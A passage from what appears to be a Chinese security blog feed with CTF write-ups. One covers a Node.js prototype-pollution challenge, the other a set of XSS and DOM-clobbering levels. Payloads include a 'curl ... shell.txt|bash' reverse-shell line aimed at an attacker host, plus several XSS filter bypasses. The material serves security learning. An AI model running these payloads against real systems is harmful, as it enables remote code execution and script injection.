&#123;</span><br><span class="line">        let q = req.query.q;</span><br><span class="line">        let a_note;</span><br><span class="line">        if (typeof(q) === &quot;undefined&quot;) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(&#x27;note&#x27;, &#123;list: a_note&#125;);</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>发现此时虽然 q 参数可控，但是也只有 q 参数可控，也就是说我们只能控制 undefsave 函数的第二个参数，而 undefsave 函数的第三个参数我们控制不了。</p><p>而对于 edit_note 方法，我们发现 edit_note 路由中会调用 edit_note 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">app.route(&#x27;/edit_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;</span><br><span class="line">        let author = req.body.author;</span><br><span class="line">        let enote = req.body.raw;</span><br><span class="line">        if (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>此时 id、author 和 raw 均为我们的可控值，那么我们则可以操纵原型链进行污染：</p><pre><code>edit_note(id, author, raw) &#123;    undefsafe(this.note_list, id + &#39;.author&#39;, author);    undefsafe(this.note_list, id + &#39;.raw_note&#39;, raw);&#125;</code></pre><p>这里 1或者2 都可以利用</p><p>那么既然找到了可以进行原型链污染的位置，就要查找何处可以利用污染的值造成攻击，我们依次查看路由，发现 &#x2F;status 路由有命令执行的操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app.route(&#x27;/status&#x27;)    // 漏洞点，只要将字典commands给污染了，就能执行我们的任意命令</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let commands = &#123;</span><br><span class="line">            &quot;script-1&quot;: &quot;uptime&quot;,</span><br><span class="line">            &quot;script-2&quot;: &quot;free -m&quot;</span><br><span class="line">        &#125;;</span><br><span class="line">        for (let index in commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                if (err) &#123;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(`stdout: $&#123;stdout&#125;`);    // 将命令执行结果输出</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(&#x27;OK&#x27;);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>这里他用的 for … in … 我们查找官方文档可以知道</p><p><img src="/2025/07/18/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/image-20250718175443628.png" alt="image-20250718175443628"></p><p>循环迭代可枚举的非符号属性，包括他所继承的object</p><p>我们可以做个测试</p><p><img src="/2025/07/18/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/image-20250718175955349.png" alt="image-20250718175955349"></p><p>通过测试也完全印证了我们的想法</p><p>那么这里我们就可以考虑怎么构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=__proto__&amp;author=curl 192.168.197.130/shell.txt|bash&amp;raw=aaaa;</span><br></pre></td></tr></table></figure><p>运用反弹shell</p><p>我们还需要在攻击机，运行nginx服务，然后vim shell.txt ，让目标主机来curl 触发反弹shell</p><p><img src="/2025/07/18/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/image-20250718180320499.png" alt="image-20250718180320499"></p><p>接下来去抓包测试，这里我用hackbar直接进行post提交</p><p><img src="/2025/07/18/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/image-20250718180436299.png" alt="image-20250718180436299"></p><p>然后在访问&#x2F;status 路由触发命令执行</p><p>偶对，这里我们需要在攻击机上监听2333端口</p><p><img src="/2025/07/18/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/image-20250718180606268.png" alt="image-20250718180606268"></p><p>访问&#x2F;status</p><p><img src="/2025/07/18/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/image-20250718180634856.png" alt="image-20250718180634856"></p><p>成功触发反弹shell</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;题目给了源码&lt;/p&gt;
&lt;p&gt;因为靶场我们不好反弹shell&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://heisha123.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="原型链污染" scheme="https://heisha123.github.io/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>XSS-DOM破坏</title>
    <link href="https://heisha123.github.io/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/"/>
    <id>https://heisha123.github.io/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/</id>
    <published>2025-07-14T08:33:03.000Z</published>
    <updated>2025-07-25T15:17:46.935Z</updated>
    
    <content type="html"><![CDATA[<p>DOM破坏基础</p><span id="more"></span><h5 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714163349243.png" alt="image-20250714163349243"></p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Challenge --&gt;</span><br><span class="line">&lt;h2 id=&quot;spaghet&quot;&gt;&lt;/h2&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    spaghet.innerHTML = (new URL(location).searchParams.get(&#x27;somebody&#x27;) || &quot;Somebody&quot;) + &quot; Toucha Ma Spaghet!&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>分析</p><p>get传值somebody 直接给h2添加属性</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?somebody=&lt;img src=&quot;1&quot; onerror=&quot;alert(1337)&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714164602338.png" alt="image-20250714164602338"></p><h5 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714164629867.png" alt="image-20250714164629867"></p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 id=&quot;maname&quot;&gt;&lt;/h2&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let jeff = (new URL(location).searchParams.get(&#x27;jeff&#x27;) || &quot;JEFFF&quot;)</span><br><span class="line">    let ma = &quot;&quot;</span><br><span class="line">    eval(`ma = &quot;Ma name $&#123;jeff&#125;&quot;`)</span><br><span class="line">    setTimeout(_ =&gt; &#123;</span><br><span class="line">        maname.innerText = ma</span><br><span class="line">    &#125;, 1000)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>分析</p><p>一样的get获取jeff的值  利用点在eval</p><p>我们可以闭合<code>&quot;</code> 然后直接<code>alert(1337)</code></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?jeff=&quot;;alert(1)//</span><br></pre></td></tr></table></figure><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714165226881.png" alt="image-20250714165226881"></p><h5 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714165258839.png" alt="image-20250714165258839"></p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Challenge --&gt;</span><br><span class="line">&lt;div id=&quot;uganda&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let wey = (new URL(location).searchParams.get(&#x27;wey&#x27;) || &quot;do you know da wey?&quot;);</span><br><span class="line">    wey = wey.replace(/[&lt;&gt;]/g, &#x27;&#x27;)</span><br><span class="line">    uganda.innerHTML = `&lt;input type=&quot;text&quot; placeholder=&quot;$&#123;wey&#125;&quot; class=&quot;form-control&quot;&gt;`</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>分析</p><p>一样通过wey get传递值</p><p>但是经过了<code>wey.replace(/[&lt;&gt;]/g, &#39;&#39;)</code> 过滤，过滤了 <code>&lt;&gt;</code> </p><p>然后通过<code>innerHTML</code>给<code>uganda</code> 赋值</p><p>因为不能通过 用户交互，所以我们不用on的点击时间</p><p>但是有一个自动获取焦点的函数 <code>onfocus</code> 并且这个函数有一个自动获取焦点的参数 <code>autofocus</code> </p><p>即可实现自动弹窗</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wey=&quot;autofocus%20onfocus=alert(1337)&quot;</span><br></pre></td></tr></table></figure><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714170139855.png" alt="image-20250714170139855"></p><h5 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714170220070.png" alt="image-20250714170220070"></p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Challenge --&gt;</span><br><span class="line">&lt;form id=&quot;ricardo&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;milos&quot; type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;True&quot; value=&quot;True&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    ricardo.action = (new URL(location).searchParams.get(&#x27;ricardo&#x27;) || &#x27;#&#x27;)</span><br><span class="line">    setTimeout(_ =&gt; &#123;</span><br><span class="line">        ricardo.submit()</span><br><span class="line">    &#125;, 2000)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>分析</p><p>通过<code>ricardo</code> get传参 然后设置定时器 2秒自动提交给form表单</p><p>然后form 表单中有method 属性接收的GET  表单属性可以通过<code>javascript:</code> 伪协议解析alert</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ricardo=javascript:alert(1337)</span><br></pre></td></tr></table></figure><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714171021502.png" alt="image-20250714171021502"></p><h5 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714171502986.png" alt="image-20250714171502986"></p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 id=&quot;will&quot;&gt;&lt;/h2&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    smith = (new URL(location).searchParams.get(&#x27;markassbrownlee&#x27;) || &quot;Ah That&#x27;s Hawt&quot;)</span><br><span class="line">    smith = smith.replace(/[\(\`\)\\]/g, &#x27;&#x27;)</span><br><span class="line">    will.innerHTML = smith</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>分析</p><p>get传承 <code>markassbrownlee</code> 获取值 ， <code>will.innerHTML = smith</code> 添加属性，但是</p><p><code>smith.replace(/[\(\\)\\]/g, &#39;&#39;)</code> 过滤了<code>()\</code></p><p>所以alert的这个括号 被过滤了，我们考虑通过实体编码绕过</p><p>因为我们在<code>url</code>地址栏传入的参数 先会经过浏览器进行<code>decode</code> 然后进入 <code>js</code> 接收到值后，通过了过滤函数，在进入<code>html</code> ，实体编码被解析为<code>()</code> </p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?markassbrownlee=&lt;img src=&quot;1&quot; onerror=&quot;alert%26lpar%3B%26%2349%3B%26%2351%3B%26%2351%3B%26%2355%3B%26rpar%3B&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714172528731.png" alt="image-20250714172528731"></p><h5 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714172546097.png" alt="image-20250714172546097"></p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* Challenge */</span><br><span class="line">balls = (new URL(location).searchParams.get(&#x27;balls&#x27;) || &quot;Ninja has Ligma&quot;)</span><br><span class="line">balls = balls.replace(/[A-Za-z0-9]/g, &#x27;&#x27;)</span><br><span class="line">eval(balls)</span><br></pre></td></tr></table></figure><p>分析</p><p>过滤掉了大小写字母，还有数字</p><p>看见了<code>eval</code>函数 利用点就在这</p><p>现在就是考虑怎么绕过这个正则</p><p>想到了jsfuck</p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714173009491.png" alt="image-20250714173009491"></p><p>直接通过</p><p>这个编码，然后进行一下<code>urlencode</code>编码 </p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ballsspan><br></pre></td></tr></table></figure><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714173304760.png" alt="image-20250714173304760"></p><p>后面我们在 研究一下<code>jsfuck</code> 到底为什么可以通过这种方式来编码</p><h5 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714173438672.png" alt="image-20250714173438672"></p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mafia = (new URL(location).searchParams.get(&#x27;mafia&#x27;) || &#x27;1+1&#x27;)</span><br><span class="line">mafia = mafia.slice(0, 50)</span><br><span class="line">mafia = mafia.replace(/[\`\&#x27;\&quot;\+\-\!\\\[\]]/gi, &#x27;_&#x27;)</span><br><span class="line">mafia = mafia.replace(/alert/g, &#x27;_&#x27;)</span><br><span class="line">eval(mafia)</span><br></pre></td></tr></table></figure><p>分析</p><p>这里限制了我们payload的长度不能超过50，且过滤了&#96;&#96;’ “ + - ! \ [ ]&#96; 所以这关完全限制了上一关的方法</p><p>而且他还过滤了 alert 所以我们不能用alert 但是我们还有另外两个可以用</p><p><code>confirm()、prompt()</code></p><p>这里我们可以直接利用，但是还有其他的办法</p><h6 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="number">8680439.</span>.<span class="title function_">toString</span>(<span class="number">30</span>))(<span class="number">1337</span>)</span><br></pre></td></tr></table></figure><p><code>..toString()</code> 可以将数字转换为字符</p><p>8680439：其实就是 30进制的alert</p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714174146435.png" alt="image-20250714174146435"></p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714174200405.png" alt="image-20250714174200405"></p><p>这里我们就是利用 这个函数</p><p>那为什么是30进制不是 其他进制 呢？</p><p>我们测试一下29进制</p><p>利用<code>parseInt()</code> 来看一下 转换alert是什么</p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714174909597.png" alt="image-20250714174909597"></p><p>这里可以看到 alert 的 t 转换回来消失了！！！ </p><p>为什么呢？</p><p>A B C D E F G H I J K L M N O P Q R S T </p><p>这里我们知道A 是10进制可以进行转换<br>T 在第30位，我们合理的进行推测，T 是不是就是30进制呢？</p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714175135098.png" alt="image-20250714175135098"></p><p>所以我30~36都可以进行转换t</p><p>那么我们这个payload <code>eval(8680439..toString(30))(1337)</code>就完全可以绕过过滤，实现<code>xss</code></p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714175432982.png" alt="image-20250714175432982"></p><h6 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>))</span><br></pre></td></tr></table></figure><p>这里我们可以清楚的理解到 是通过 <code>location.hash.slice(1)</code> 这个函数来传值，我们可以通过#来插入我们的恶意代码，但是我们的xss代码并不会进入正则过滤中</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mafia=eval(location.hash.slice(1))#alert(1337)</span><br></pre></td></tr></table></figure><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714175631542.png" alt="image-20250714175631542"></p><h6 id="第三种方法"><a href="#第三种方法" class="headerlink" title="第三种方法"></a>第三种方法</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>(<span class="regexp">/ALERT(1337)/</span>.<span class="property">source</span>.<span class="title function_">toLowerCase</span>())()</span><br></pre></td></tr></table></figure><p>因为js是严格区分大小写的 所以我们传入的<code>ALERT</code>  并不会被过滤，我们就要想办法将他转为小写</p><p>这里我们查官方文档了解一下<code>Function()</code>的作用</p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714175931432.png" alt="image-20250714175931432"></p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714180008622.png" alt="image-20250714180008622"></p><p>Function()是构造函数</p><p>在看看.source 是啥</p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714180718828.png" alt="image-20250714180718828"></p><p>返回正则表达式的文本内容（即 <code>/pattern/flags</code> 中的 <code>pattern</code> 部分），不包含分隔符和标志。</p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714180844540.png" alt="image-20250714180844540"></p><p>.toLowerCase()转小写</p><p>这个payload我们就知道先通过Function 构造函数 然后 传入 <code>/ALERT(1337)/</code> 通过.source 获取到<code>ALERT(1337</code> 在通过 <code>toLowerCase()</code> 转成小写 ，最后<code>()</code>立即执行</p><p>这个payload的好处是我们可以绕过他的关键字匹配，构造自己的函数</p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714181507067.png" alt="image-20250714181507067"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function(/ALERT(1337)/.source.toLowerCase())()</span><br></pre></td></tr></table></figure><h5 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714181615220.png" alt="image-20250714181615220"></p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 id=&quot;boomer&quot;&gt;Ok, Boomer.&lt;/h2&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    boomer.innerHTML = DOMPurify.sanitize(new URL(location).searchParams.get(&#x27;boomer&#x27;) || &quot;Ok, Boomer&quot;)</span><br><span class="line">    setTimeout(ok, 2000)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>分析</p><p>这里他引入了<code>DOMPurify</code>防御用户输入框架，这个框架至今都在维护，而且绕过的概率很低，所以我们不考虑绕过的方法</p><p>看到下面<code>setTimeout(ok, 2000)</code> 这里的<code>ok</code>并没有进行定义</p><p>那么我们可以使用<code>dom clobbering</code>称之为<code>dom</code>破坏技术</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=ok href=javasCript:alert(1337)&gt;</span><br></pre></td></tr></table></figure><p>我们尝试传入这个来重新构造ok函数</p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250715113259686.png" alt="image-20250715113259686"></p><p>但是发现被框架过滤了，我们去github上看一下，找一下白名单</p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250715113345829.png" alt="image-20250715113345829"></p><p><code>/^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp|matrix):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))</code></p><p>这里测试发现 </p><p><code>mailto|tel|callto|sms|cid|xmpp|matrix</code></p><p>全部都能够触发alert</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?boomer=&lt;a id=ok href=&quot;tel:alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714183323651.png" alt="image-20250714183323651"></p><p>那么为什么我们会想到用A标签呢？</p><p>1.我们需要传入一个我们可控得字符，且他能被<code>setTimeout</code> 执行</p><p>toString </p><p>所以我们可以通过以下代码来进⾏fuzz得到可以通过<code>toString</code>⽅法将其转换成字符串类型的标签： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Object.getOwnPropertyNames(window)</span><br><span class="line">.filter(p =&gt; p.match(/Element$/))</span><br><span class="line">.map(p =&gt; window[p])</span><br><span class="line">.filter(p =&gt; p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString</span><br><span class="line">!== Object.prototype.toString) </span><br></pre></td></tr></table></figure><p>我们可以得到两种标签对象：<code>HTMLAreaElement ()</code>&amp; <code>HTMLAnchorElement ()</code>，这两个 标签对象我们都可以利⽤href属性来进⾏字符串转换。</p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250715114025687.png" alt="image-20250715114025687"></p><p><code>HTMLAreaElement</code>  是<code>area</code>但是他是一个空元素不能容纳任何内容，所以我们不考虑</p><p>那么就只剩下<code>HTMLAnchorElement</code>  这个的意思是锚点的意思，</p><p>也就是跳转，html中哪个标签可以跳转实现呢？</p><p>答案呼之欲出了：A标签的 href属性 </p><p>所以这里dom破坏就是在a标签的herf属性上传入我们的xss代码！</p><h5 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250715172949724.png" alt="image-20250715172949724"></p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Challenge --&gt;</span><br><span class="line">&lt;div id=&quot;pwnme&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var input = (new URL(location).searchParams.get(&#x27;debug&#x27;) || &#x27;&#x27;).replace(/[\!\-\/\#\&amp;\;\%]/g, &#x27;_&#x27;);</span><br><span class="line">    var template = document.createElement(&#x27;template&#x27;);</span><br><span class="line">    template.innerHTML = input;</span><br><span class="line">    pwnme.innerHTML = &quot;&lt;!-- &lt;p&gt; DEBUG: &quot; + template.outerHTML + &quot; &lt;/p&gt; --&gt;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>分析</p><p>这里我们可以看到，对get传参<code>debug</code>进行了过滤</p><p>将 <code>! - / # &amp; ; %</code>  进行了过滤</p><p>那我们现在考虑，在哪个地方可以利用进行dom破坏呢？</p><p>我们知道形如 <code>document.x</code> 这种我们都可以进行dom破坏</p><p>这里我们很容易就发现 <code>template.outerHTML</code>，但是被<code>&lt;!--</code> <code>--&gt;</code> 包裹，而且为多行注释，那么我们如何进行绕过呢？</p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718194412725.png" alt="image-20250718194412725"></p><p>我们先不考虑注释符，正常插入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&#x27;1&#x27; onerror=&#x27;alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718210013062.png" alt="image-20250718210013062"></p><p>发现正如我们预料的一样，我们的payload被注释掉了</p><p>那我们就要思考如何来闭合 <code>&lt;!--</code></p><p>经过查找大量资料发现，<code>&lt;?</code>可以把p标签逃逸出来</p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718210214704.png" alt="image-20250718210214704"></p><p>那么这是为什么呢？</p><p>下断调试看看</p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718211205269.png" alt="image-20250718211205269"></p><p>发现 我们传入的<code>&lt;?</code> 变为了<code> &lt;!--?--&gt;</code> 这样他进入</p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718211335880.png" alt="image-20250718211335880"></p><p>就把P标签逃逸出来了</p><p>根据w3c</p><p>规范文档，可以在以下链接找到：</p><p>🔗 <strong>HTML Standard - Parsing HTML Documents</strong><br>🔗 <a href="https://html.spec.whatwg.org/multipage/parsing.html#parsing-html-documents">https://html.spec.whatwg.org/multipage/parsing.html#parsing-html-documents</a></p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718232910418.png" alt="image-20250718232910418"></p><p>当遇到<code>&lt;</code> 号的时候 会切换到 标签开始状态   <a href="https://html.spec.whatwg.org/multipage/parsing.html#tag-open-state">tag open state</a>.</p><p>然后</p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718233511852.png" alt="image-20250718233511852"></p><p>又因为下一个字符是<code>?</code> 他会进入 <a href="https://html.spec.whatwg.org/multipage/parsing.html#bogus-comment-state">bogus comment state</a>.</p><p><img 